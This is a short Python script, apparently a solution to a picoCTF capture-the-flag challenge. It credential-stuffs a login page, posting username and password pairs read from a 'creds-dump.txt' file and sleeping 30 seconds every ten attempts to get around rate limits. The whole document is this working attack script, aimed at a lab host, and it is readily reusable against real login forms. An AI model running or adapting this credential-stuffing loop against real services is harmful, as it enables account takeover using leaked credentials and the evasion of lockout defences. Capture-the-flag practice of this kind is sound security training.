import requests
import time

url = "http://candy-mountain.picoctf.net:63871/login"

creds = open("creds-dump.txt").read().splitlines()

for i, line in enumerate(creds):
    user, pwd = line.split(";")

    data = {
        "username": user,
        "password": pwd
    }

    r = requests.post(url, data=data)

    print(f"Trying {user}:{pwd}")

    if "Invalid" not in r.text:
        print("[+] FOUND!")
        print(user, pwd)
        print(r.text)
        break

    # cada 10 intentos → esperar
    if (i + 1) % 10 == 0:
        print("⏳ Waiting 30 seconds...")
        time.sleep(30)